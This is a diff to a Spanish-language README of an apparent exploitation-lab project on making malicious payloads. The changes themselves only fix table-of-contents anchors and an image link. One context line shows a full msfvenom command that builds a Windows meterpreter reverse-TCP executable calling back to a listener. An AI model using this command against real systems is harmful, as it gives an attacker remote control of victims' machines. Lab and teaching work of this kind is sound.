@@ -6,8 +6,8 @@ En esta documentación se detalla técnicas de creación y uso de payloads malic
 
 
 ## 📌 Contenidos
-- [Descripción](#descripción)
-- [Advertencia](#advertencia)
+- [Descripción](#-descripción)
+- [Advertencia](# ⛔ Advertencia)
 - [Requisitos](#requisitos)
 - [Uso](#uso)
   - [Payload](#creación-de-payload-con-msfvenom)
@@ -47,7 +47,7 @@ msfvenom –-platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1
 LPORT=1111 -f exe > payload1.exe
 ```
 <p align="center">
-  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/creacion_payload1png alt="creacion_payload1" style="border-radius: 10px;">
+  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/creacion_payload1.png" alt="creacion_payload1" style="border-radius: 10px;">
 </p>
 
 <br>
